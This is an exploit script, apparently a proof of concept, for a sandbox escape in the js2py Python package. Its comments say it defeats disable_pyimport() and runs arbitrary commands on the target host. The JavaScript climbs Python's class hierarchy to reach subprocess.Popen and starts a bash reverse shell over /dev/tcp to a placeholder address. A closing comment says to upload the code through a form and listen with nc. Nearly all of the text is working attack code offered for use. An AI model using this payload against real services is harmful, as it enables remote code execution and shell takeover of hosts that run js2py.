# You just found a service that imports js2py with something like that:
# js2py.disable_pyimport()
# to stop JavaScript code from escaping the js2py environment. 
# But with this vulnerability, an attacker can evade this restriction and execute any command on the target host.
  
# js2py is a popular python package that can evaluate javascript code inside python interpreter. 
# It is used by various web scrapers to parse javascript code on the website.


let cmd = "bash -c 'exec 5<>/dev/tcp/10.10.xx.xx/xxxx;cat <&5 | while read line; do $line 2>&5 >&5; done'"
let hacked, bymarve, n11
let getattr, obj

hacked = Object.getOwnPropertyNames({})
bymarve = hacked.__getattribute__
n11 = bymarve("__getattribute__")
obj = n11("__class__").__base__
getattr = obj.__getattribute__

function findpopen(o) {
    let result;
    for(let i in o.__subclasses__()) {
        let item = o.__subclasses__()[i]
        if(item.__module__ == "subprocess" && item.__name__ == "Popen") {
            return item
        }
        if(item.__name__ != "type" && (result = findpopen(item))) {
            return result
        }
    }
}

n11 = findpopen(obj)(cmd, -1, null, -1, -1, -1, null, null, true).communicate()
console.log(n11)
n11

# so you just upload this code in the form at you can upload js code and open a nc -lvnp xxxx
